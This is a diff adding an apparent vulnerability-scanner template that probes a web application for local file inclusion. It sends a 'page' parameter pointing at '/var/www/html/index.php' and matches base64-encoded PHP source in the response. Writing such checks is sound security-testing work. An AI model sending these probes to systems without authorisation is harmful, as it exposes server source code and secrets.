@@ -1,0 +1,20 @@
+id: lfi3-113
+name: 'Traversal to system file via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via page'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '/var/www/html/index.php'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
